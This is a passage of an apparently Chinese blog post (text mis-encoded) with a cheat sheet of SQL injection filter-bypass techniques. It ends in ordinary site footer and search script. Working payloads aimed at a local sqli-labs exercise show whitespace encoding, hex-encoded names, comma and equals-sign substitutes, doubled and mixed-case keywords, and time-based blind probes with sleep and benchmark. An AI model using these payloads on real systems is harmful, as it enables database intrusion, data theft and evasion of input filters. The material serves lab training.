<p><code>%0a</code> ï¼šæ–°å»ºä¸€è¡Œ</p>
<p><code>%0b</code> ï¼šTAB(å‚ç›´)</p>
<p><code>%0c</code> ï¼šæ–°çš„ä¸€é¡µ</p>
<p><code>%0d</code> ï¼šreturnåŠŸèƒ½</p>
<p><code>%a0</code> ï¼šç©ºæ ¼</p>
<p><code>%00</code> ï¼šç©º</p>
<p><a target="_blank" rel="noopener" href="http://10.211.55.6/sqli-labs/Less-26/">http://10.211.55.6/sqli-labs/Less-26/</a></p>
<blockquote>
<p>?id&#x3D;<code>0&#39;%0bunion%0bselect%0b1,database(),&#39;3</code></p>
</blockquote>
<aside>

<p>ğŸ’¡ åœ¨ Windows ä¸‹ä¼šæœ‰æ— æ³•ç”¨ç‰¹æ®Šå­—ç¬¦ä»£æ›¿ç©ºæ ¼çš„é—®é¢˜ï¼Œè¿™æ˜¯ Apache è§£æçš„é—®é¢˜ï¼ŒLinux ä¸‹æ— è¿™ä¸ªé—®é¢˜ã€‚</p>
</aside>

<p><strong>ä½¿ç”¨æ³¨é‡Šï¼š</strong><code>/**/</code>  <code>/*!*/</code></p>
<p><strong>ä½¿ç”¨æµ®ç‚¹æ•°ï¼š</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8E0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8.0</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"># ä»¥ä¸Šè¯­å¥ç­‰ä»·äº</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>

<h3 id="2ã€ç»•è¿‡å¼•å·"><a href="#2ã€ç»•è¿‡å¼•å·" class="headerlink" title="2ã€ç»•è¿‡å¼•å·"></a>2ã€ç»•è¿‡å¼•å·</h3><p>ä¸€èˆ¬å¼•å·ä¼šå‡ºç°åœ¨SQLè¯­å¥çš„<code>where</code>å­å¥ä¸­</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>ä½¿ç”¨å¯¹åº”åå…­è¿›åˆ¶çš„å­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">users <span class="operator">=</span> <span class="number">0x7573657273</span></span><br><span class="line">security <span class="operator">=</span> <span class="number">0x7365637572697479</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x7573657273</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="number">0x7365637572697479</span></span><br></pre></td></tr></table></figure>

<h3 id="3ã€ç»•è¿‡é€—å·"><a href="#3ã€ç»•è¿‡é€—å·" class="headerlink" title="3ã€ç»•è¿‡é€—å·"></a>3ã€ç»•è¿‡é€—å·</h3><p><code>left()</code> <code>substr()</code> ç­‰å­—ç¬¦ä¸²å¤„ç†å‡½æ•°ä¸­å­˜åœ¨<code>,</code></p>
<p><strong>ä½¿ç”¨ <strong><strong><code>substr()</code></strong></strong> ï¼Œ</strong><strong><code>mid()</code></strong>** ï¼ŒåŠ****<code>from to</code>**</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>)</span><br><span class="line"><span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><code>limit</code> ä¸­å­˜åœ¨<code>,</code></p>
<p><strong>ä½¿ç”¨</strong>**<code>offset</code>**<strong>è¿›è¡Œç»•è¿‡</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.users limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"># ç­‰ä»·äº</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.users limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span> </span><br></pre></td></tr></table></figure>

<p><code>union select 1,2,3</code> ç­‰è”åˆæŸ¥è¯¢ä¸­å¤šåˆ—ä¹‹é—´å­˜åœ¨<code>,</code></p>
<p><strong>ä½¿ç”¨</strong>**<code>join</code>**<strong>è¿›è¡Œç»•è¿‡</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> security.users <span class="keyword">UNION</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"># ç­‰ä»·äº</span><br><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> security.users <span class="keyword">UNION</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((<span class="keyword">select</span> <span class="number">1</span>)A <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)B <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)C);</span><br></pre></td></tr></table></figure>

<h3 id="4ã€ç»•è¿‡ç­‰å·"><a href="#4ã€ç»•è¿‡ç­‰å·" class="headerlink" title="4ã€ç»•è¿‡ç­‰å·"></a>4ã€ç»•è¿‡ç­‰å·</h3><p><strong>ä½¿ç”¨</strong><strong><code>like</code><strong><strong>ã€</strong></strong><code>rlike</code><strong><strong>ã€</strong></strong><code>regexp</code></strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> security.users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;dumb&#x27;</span></span><br><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> security.users <span class="keyword">where</span> username rlike <span class="string">&#x27;dumb&#x27;</span></span><br><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> security.users <span class="keyword">where</span> username regexp <span class="string">&#x27;dumb&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="5ã€ç»•è¿‡or-and-not-xor"><a href="#5ã€ç»•è¿‡or-and-not-xor" class="headerlink" title="5ã€ç»•è¿‡or and not xor"></a>5ã€ç»•è¿‡<code>or</code> <code>and</code> <code>not</code> <code>xor</code></h3><p><strong>ä½¿ç”¨ç­‰ä»·ç¬¦å·è¿›è¡Œç»•è¿‡</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="operator">=</span><span class="operator">=</span> <span class="operator">&amp;&amp;</span></span><br><span class="line"><span class="keyword">or</span>  <span class="operator">=</span><span class="operator">=</span> <span class="operator">||</span></span><br><span class="line"><span class="keyword">not</span> <span class="operator">=</span><span class="operator">=</span> ï¼</span><br><span class="line">xor <span class="operator">=</span><span class="operator">=</span> <span class="number">1</span><span class="operator">^</span><span class="number">1</span>  # ç›¸åŒä¸ºå‡ï¼Œä¸åŒä¸ºçœŸ</span><br></pre></td></tr></table></figure>

<h3 id="6ã€ç»•è¿‡æ³¨é‡Šç¬¦å·"><a href="#6ã€ç»•è¿‡æ³¨é‡Šç¬¦å·" class="headerlink" title="6ã€ç»•è¿‡æ³¨é‡Šç¬¦å·"></a>6ã€ç»•è¿‡æ³¨é‡Šç¬¦å·</h3><p><strong>ä½¿ç”¨</strong><strong><code>#</code><strong><strong>ã€ <strong><strong><code>--+</code></strong></strong> ã€</strong></strong><code>%23</code></strong>** ã€****<code>--</code>****  è¿›è¡Œæ³¨é‡Š**</p>
<p><code>#</code>å’Œ<code>--</code>  å±äºmysqlçš„æ³¨é‡Š</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> security.users # è¿™æ˜¯#å·æ³¨é‡Š</span><br><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> security.users <span class="comment">-- è¿™æ˜¯-- æ³¨é‡Š</span></span><br></pre></td></tr></table></figure>

<p><strong>ä½¿ç”¨é—­åˆè¿›è¡Œç»•è¿‡</strong></p>
<blockquote>
<p>id&#x3D;1â€™ union select 1,2,3 || â€˜1</p>
</blockquote>
<h3 id="7ã€ç»•è¿‡å…³é”®å­—"><a href="#7ã€ç»•è¿‡å…³é”®å­—" class="headerlink" title="7ã€ç»•è¿‡å…³é”®å­—"></a>7ã€ç»•è¿‡å…³é”®å­—</h3><p>SQLè¯­å¥åœ¨æœ€ç»ˆæ‰§è¡Œä¹‹å‰ï¼Œè¿‡æ»¤å…¶ä¸­çš„å…³é”®å­—</p>
<p><strong>åŒå†™å…³é”®å­—</strong></p>
<p>å°†é»‘åå•ä¸­çš„å…³é”®å­—åˆ é™¤ï¼Œä½†ä»…æ‰§è¡Œä¸€æ¬¡</p>
<blockquote>
<p>id&#x3D;1â€™ un<code>union</code>ion select 1,2,3â€“+</p>
</blockquote>
<p><strong>å¤§å°å†™æ··åˆ</strong></p>
<p>åœ¨æ¯”å¯¹é»‘åå•æ—¶ï¼Œæœªå¿½ç•¥å¤§å°å†™</p>
<blockquote>
<p>id&#x3D;1â€™ UniON SElEcT 1,2,3â€“+</p>
</blockquote>
<p><strong>ä½¿ç”¨ç›¸åŒåŠŸèƒ½çš„å…³é”®è¯</strong></p>
<p><code>sleep()</code> &#x3D;&gt; <code>benchmark()</code> # benchmark æ‰§è¡Œ[å‚æ•°ä¸€]æ¬¡[å‚æ•°äºŒ]</p>
<blockquote>
<p>?id&#x3D;1â€™ and if(left(database(),1)&#x3D;â€™sâ€™,<code>benchmark(99999999,md5(1))</code>,1)â€“+<br>?id&#x3D;1â€™ and if(left(database(),1)&#x3D;â€™sâ€™,<code>sleep(5)</code>,1)â€“+</p>
</blockquote>
<p><code>left()</code> <code>right()</code> <code>mid()</code> <code>substr()</code> <code>lpad()</code> ç­‰å­—å¤„ç†å‡½æ•°</p>
<blockquote>
<p>?id&#x3D;1â€™ and <code>right</code>(database(),1)&#x3D;â€™yâ€™â€“+<br>?id&#x3D;1â€™ and <code>left</code>(database(),1)&#x3D;â€™sâ€™â€“+<br>?id&#x3D;1â€™ and <code>mid</code>(database(),1,1)&#x3D;â€™sâ€™â€“+<br>?id&#x3D;1â€™ and <code>lpad</code>(database(),1,â€™zâ€™)&#x3D;â€™sâ€™â€“+</p>
</blockquote>
<p><code>into</code>ä»£æ›¿<code>order by</code></p>
<blockquote>
<p>?id&#x3D;1â€™ into @1,@2â€“+<br>?id&#x3D;1â€™ into @1,@2,@3â€“+</p>
</blockquote>
<p><strong>ä½¿ç”¨å…¶ä»–çš„æ³¨å…¥æ–¹æ³•</strong></p>
<p>æ— åˆ—åæ³¨å…¥</p>
<hr>
<p>å‚è€ƒèµ„æ–™ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/soldi_er/article/details/116901009">https://blog.csdn.net/soldi_er&#x2F;article&#x2F;details&#x2F;116901009</a></p>
<p><a target="_blank" rel="noopener" href="https://err0r.top/article/mardasctf/">https://err0r.top/article/mardasctf/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.dkkkkk.com/basis/NoColumnInjection/">https://blog.dkkkkk.com/basis/NoColumnInjection/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/165567.html">https://www.freebuf.com/column/165567.html</a></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        æ–‡ç« ä½œè€…:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">LuoLuo</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        æ–‡ç« é“¾æ¥:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://lfsdlfsd-sudo.github.io/2022/08/25/SQL%E6%B3%A8%E5%85%A5/">https://lfsdlfsd-sudo.github.io/2022/08/25/SQL%E6%B3%A8%E5%85%A5/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        ç‰ˆæƒå£°æ˜:
                    </i>
                </span>
                <span class="reprint-info">
                    æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ¥å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº
                    <a href="/about" target="_blank">LuoLuo</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>å¤åˆ¶æˆåŠŸï¼Œè¯·éµå¾ªæœ¬æ–‡çš„è½¬è½½è§„åˆ™</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">æŸ¥çœ‹</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            <span class="chip bg-color">æ— æ ‡ç­¾</span>
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>å¾®ä¿¡æ‰«ä¸€æ‰«å³å¯åˆ†äº«ï¼</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">èµ</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">ä½ çš„èµè¯†æ˜¯æˆ‘å‰è¿›çš„åŠ¨åŠ›</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">æ”¯ä»˜å®</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">å¾® ä¿¡</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="æ”¯ä»˜å®æ‰“èµäºŒç»´ç ">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.jpg" class="reward-img" alt="å¾®ä¿¡æ‰“èµäºŒç»´ç ">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;ä¸Šä¸€ç¯‡</div>
            <div class="card">
                <a href="/2022/08/25/XSS%E6%94%BB%E5%87%BB/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="XSSæ”»å‡»">
                        
                        <span class="card-title">XSSæ”»å‡»</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2022-08-25
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            LuoLuo
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                ä¸‹ä¸€ç¯‡&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2022/08/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="ä¿¡æ¯æ”¶é›†">
                        
                        <span class="card-title">ä¿¡æ¯æ”¶é›†</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-08-25
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            LuoLuo
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- ä»£ç å—åŠŸèƒ½ä¾èµ– -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- ä»£ç è¯­è¨€ -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- ä»£ç å—å¤åˆ¶ -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- ä»£ç å—æ”¶ç¼© -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;ç›®å½•</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC æ‚¬æµ®æŒ‰é’®. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* ä¿®å¤æ–‡ç« å¡ç‰‡ div çš„å®½åº¦. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // åˆ‡æ¢TOCç›®å½•å±•å¼€æ”¶ç¼©çš„ç›¸å…³æ“ä½œ.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="tencent"
                   type="playlist"
                   id="8277932559"
                   fixed='true'
                   autoplay='true'
                   theme='#42b983'
                   loop='all'
                   order='list'
                   preload='auto'
                   volume='0.5'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    
    <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2022-2023</span>
            
            <span id="year">2022</span>
            <a href="/about" target="_blank">LuoLuo</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;ç«™ç‚¹æ€»å­—æ•°:&nbsp;<span
                class="white-color">13.9k</span>&nbsp;å­—
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;æ€»è®¿é—®é‡:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;æ¬¡
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;æ€»è®¿é—®äººæ•°:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;äºº
            </span>
            
            <br>
            
            <span id="sitetime">è½½å…¥è¿è¡Œæ—¶é—´...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2022";
                    var startMonth = "8";
                    var startDate = "24";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "æœ¬ç«™å·²å®‰å…¨è¿è¡Œ " + diffDays + " å¤© " + diffHours +
                            " å°æ—¶ " + diffMinutes + " åˆ†é’Ÿ " + diffSeconds + " ç§’";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "æœ¬ç«™å·²å®‰å…¨è¿è¡Œ " + diffYears + " å¹´ " + diffDays +
                            " å¤© " + diffHours + " å°æ—¶ " + diffMinutes + " åˆ†é’Ÿ " + diffSeconds + " ç§’";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/lfsdlfsd-sudo" class="tooltipped" target="_blank" data-tooltip="è®¿é—®æˆ‘çš„GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:2091823062@qq.com" class="tooltipped" target="_blank" data-tooltip="é‚®ä»¶è”ç³»æˆ‘" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2091823062" class="tooltipped" target="_blank" data-tooltip="QQè”ç³»æˆ‘: 2091823062" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS è®¢é˜…" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- æœç´¢é®ç½©æ¡† -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;æœç´¢</span>
            <input type="search" id="searchInput" name="s" placeholder="è¯·è¾“å…¥æœç´¢çš„å…³é”®å­—"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
